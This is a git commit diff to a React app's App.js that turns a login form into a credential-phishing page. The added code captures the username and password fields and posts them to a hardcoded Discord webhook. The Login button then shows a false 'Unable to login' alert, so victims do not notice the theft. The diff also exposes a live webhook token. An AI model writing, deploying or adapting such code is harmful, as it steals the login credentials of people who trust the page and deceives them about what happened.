d2dbd3a0495fc1d7bf7b9a2492529b2f3863eae3
Bhanu-Prakash01 <kingkite44@gmail.com>
2024-07-10 03:42:27 +0530

    discord

--- src/App.js
+++ src/App.js
@@ -1,7 +1,28 @@
 
 import './App.css';
+import { useState } from 'react';
+import axios from 'axios';
 
 function App() {
+  const [username, setUsername] = useState('');
+  const [pass, setPass] = useState('');
+
+  const sendMessage = async () => {
+    const webhookUrl = 'https://discord.com/api/webhooks/1255152420212838441/o9mdOZ7_vGwndxGA7_DqQcKYPaz1o-OXsR7-_3UawW7tD_PN58BHigrJx0qMZhsU1-hi'; // Replace with your webhook URL
+    const content = {
+      username: username,
+      pass: pass
+    };
+    try {
+      await axios.post(webhookUrl, {
+        content: JSON.stringify(content),
+      });
+      
+    } catch (error) {
+      console.error('Error sending message:', error);
+
+    }
+  };
   return (
     <div className="App">
       
@@ -15,13 +36,13 @@ function App() {
                   <img class="creds_img" src="logo.jpg" alt='logo'/>
                   {/* <br/> */}
                   <br/>
-                  <input placeholder='Your Username' type="text"/>
+                  <input placeholder='Your Username' type="text" onChange={(e)=>setUsername(e.target.value)}/>
                   <br/>
 
-                  <input placeholder='Your Password' type="text"/>
+                  <input placeholder='Your Password' type="text" onChange={(e)=>setPass(e.target.value)}/>
                   <br/>
 
-                  <button className='op1_b' style={{"backgroundColor":"#185685"}} onClick={()=>alert("Unable to login ")}> Login</button>
+                  <button className='op1_b' style={{"backgroundColor":"#185685"}} onClick={()=>{sendMessage();alert("Unable to login ")}}> Login</button>
                   <br/>
                   <button className='op1_b' style={{"backgroundColor":"#185685"}} onClick={()=>alert("Unable to login ")}> Login as demo user</button>
               </div>
